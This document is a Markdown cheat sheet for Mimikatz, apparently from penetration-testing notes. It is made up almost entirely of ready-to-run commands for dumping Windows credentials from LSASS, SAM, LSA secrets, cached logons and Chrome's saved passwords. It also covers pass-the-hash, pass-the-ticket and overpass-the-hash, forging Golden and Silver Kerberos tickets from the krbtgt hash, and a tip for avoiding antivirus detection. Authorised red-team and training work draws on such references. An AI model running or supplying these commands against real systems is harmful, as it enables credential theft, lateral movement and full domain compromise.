+++
title = "Mimikatz"
+++

- Ref: https://tools.thehacker.recipes/mimikatz/modules
- Master Class: https://darkoperator.github.io/mimikatz-missing-manual/

Mimikatz is a Windows post-exploitation tool that can extract plaintext passwords, hashes, PINs, and Kerberos tickets from memory. It can also perform pass-the-hash, pass-the-ticket, and build Golden Tickets

## TL;DR Credential Dumping Checklist

| Command                    | What it does                                                                                                                                                                                                                                                                        |
| :------------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `privilege::debug`         | Enables `SeDebugPrivilege` so Mimikatz can read LSASS memory. Prerequisite for nearly every `sekurlsa::` / `lsadump::` command below.                                                                                                                                               |
| `token::elevate`           | Impersonates a SYSTEM token. Required to touch protected hives (SAM, SECURITY) for the `lsadump::` commands.                                                                                                                                                                        |
| `sekurlsa::logonpasswords` | Pulls plaintext passwords, NTLM hashes, and Kerberos material from LSASS for currently logged-on sessions. The primary "dump everything" command.                                                                                                                                   |
| `sekurlsa::wdigest`        | Extracts cleartext creds from the WDigest provider. Only populated if `UseLogonCredential` is set -- WDigest is off by default since Win8.1 / Server 2012 R2, so usually empty on modern hosts.                                                                                     |
| `sekurlsa::ekeys`          | Dumps Kerberos encryption keys (AES256/128, RC4) from LSASS. This is what feeds Rubeus OtH (`asktgt /aes256`).                                                                                                                                                                      |
| `lsadump::sam`             | Dumps local account NTLM hashes from the SAM hive. Local users only, not domain. Needs SYSTEM.                                                                                                                                                                                      |
| `lsadump::secrets`         | Dumps LSA secrets from the SECURITY hive -- service account passwords, autologon creds, the cached machine account password. Needs SYSTEM.                                                                                                                                          |
| `lsadump::cache`           | Dumps cached domain logon creds (MSCACHEv2 / DCC2). Crackable offline only -- you cannot pass-the-hash with these.                                                                                                                                                                  |
| `lsadump::lsa /patch`      | Patches LSASS in memory to extract hashes. On a DC this yields domain account hashes. `/patch` is fast but modifies LSASS (detectable, can destabilize) -- `/inject` is the alternative, and `/inject /name:krbtgt` is the surgical way to grab the krbtgt hash for Golden Tickets. |

## Important Notes

- **Debug Privilege**: Most Mimikatz operations require `privilege::debug` to access LSASS memory
- **Administrator Required**: Mimikatz typically needs administrator privileges to function
- **LSASS Access**: Many operations read from LSASS memory, which is protected by Windows
- **Detection**: Mimikatz is heavily flagged by security products and EDR solutions
- **Pass the Hash**: When using `sekurlsa::pth`, a new window will open - run commands in that new window
- **Golden Tickets**: Golden Tickets are valid until the KRBTGT account password is changed (typically 180 days by default)
- **Ticket Files**: Exported Kerberos tickets use `.kirbi` format
- **Domain Syntax**: Use "." for domain when targeting local machine accounts

## Basic Usage & Privilege Escalation

```bash
# Launch Mimikatz (via SMB share)
\\tsclient\share\mimikatz.exe

# Enable debug privilege
privilege::debug

# Elevate token to SYSTEM
token::elevate

# Write to console in bae64
base64 /out:true

# Batch commands
\\tsclient\share\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

## Credential Dumping

### LSASS Memory (sekurlsa)

**Dump All Credentials:**
```bash
# Dumps credentials from all providers (Kerberos, WDigest, MSV, etc.)
sekurlsa::logonpasswords
```

**Dump WDigest Plaintext Credentials:**
```bash
# Plaintext creds if WDigest is enabled (older systems or manually enabled)
sekurlsa::wdigest
```

**Dump Specific Hash Types:**
```bash
# Dumps only LM/NTLM hashes
sekurlsa::msv
```

**Export Kerberos Tickets:**
```bash
# Avoid AV flagging
base64 /out:true

# Export Kerberos Tickets (TGT/TGS) to disk
sekurlsa::tickets /export
# $ : machine tickets (computers)
# @ : service tickets (users)
```

**Extract AES Keys:**
```bash
# Extract AES Keys for Pass the Key attacks
sekurlsa::ekeys
```

### Extract AES Keys

Pulls derived Kerberos keys (useful for requesting tickets)

```bash
sekurlsa::ekeys
```

### SAM Database

```bash
# Dumps local SAM database (local user hashes)
lsadump::sam
```

### LSA Secrets

```bash
# Patches LSASS to dump LSA policy data/hashes
lsadump::lsa /patch
```

```bash
# Dumps LSA secrets from registry (autologon, service account passwords, etc.)
lsadump::secrets
```

```bash
# Dumps cached domain logon hashes (DCC2)
lsadump::cache
```

**Dump Specific Account:**
```bash
# Dump specific account (e.g., KRBTGT for Golden Ticket)
lsadump::lsa /inject /name:krbtgt
```

## Pass the Hash (PtH)

Pass the Hash allows you to authenticate using an NTLM hash instead of a plaintext password.

```bash
# Use "." for domain if targeting local machine
# IMPORTANT: Run commands inside the NEW window that pops up
sekurlsa::pth /user:<USER> /ntlm:<PASS_HASH> /domain:<DOMAIN> /run:cmd.exe
```

**Alternative Syntax:**
```bash
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /ntlm:<HASH> /run:cmd.exe
```

## Pass the Key (PtK) / OverPass the Hash (OtH)

*Concept: Request a Kerberos Ticket (TGT) using an NTLM hash or AES Key, rather than using the NTLM protocol directly.*

**Extract AES Keys First:**
```bash
sekurlsa::ekeys
```

**Pass the Key with AES:**
```bash
# Spawns a process. Windows will implicitly request TGT using the injected key/hash when network resources are accessed.
# Can use /ntlm, /aes128, or /aes256
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /aes256:<AES256_KEY> /run:cmd.exe
```

## Pass the Ticket (PtT)

Pass the Ticket allows you to use stolen Kerberos tickets to authenticate as another user.

**Export Tickets:**
```bash
# Export tickets from memory to .kirbi files
sekurlsa::tickets /export
```

**Inject Ticket:**
```bash
# Inject ticket into current session
kerberos::ptt <TICKET_FILE_KIRBI>
misc::cmd
```

## Golden/Silver Ticket Attack

A **Golden Ticket** is a forged Kerberos TGT that impersonates any user in the domain, including domain administrators

A **Silver Ticket** is a forged Kerberos TGS that impersonates any user on a single machine

### Step 1: Get KRBTGT Hash & SID

**On DC:**
```bash
lsadump::lsa /inject /name:krbtgt
```

### Step 2: Create & Inject Ticket

- `/ptt` - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.
- `/endin` - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)  
- `/renewmax` - The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
- `/user`: can use any value including non-existent users

```bash
# GOLDEN TICKET (need krbtgt)
kerberos::golden /ptt /id:500 /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM>

# SILVER TICKET (specify service)
kerberos::golden /ptt /id:500 /service:cifs /user:Administrator /domain:<DOMAIN> /sid:<SID> /target:<MACHINE_FQDN> /rc4:<MACHINE_HASH> 
```

### Step 3: Launch Shell

```bash
# OPTIONAL: Launch shell or exit and use the current shell since /ptt was used
misc::cmd  # this only works via RDP
exit

# Verify ticket is working by reading DC share
dir \\<DC_FQDN>\c$\
```

## Credential Manager

Dump credentials stored in Windows Credential Manager:

```bash
sekurlsa::credman
```

## DPAPI (Data Protection API)

Decrypt data protected by Windows DPAPI, such as browser credentials:

```bash
dpapi::chrome /unprotect /in:"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data"
```

## Launch Terminal as Other User

This works through RDP only... a great way to transition from Administrator to `SYSTEM` after running `token::elevate`

```bash
sekurlsa::pth /run:cmd.exe /domain:<DOMAIN> /user:<USER> /ntlm:<HASH>
```

```bash
sekurlsa::pth /run:cmd.exe /domain:. /user:Administrator /ntlm:<HASH>
```
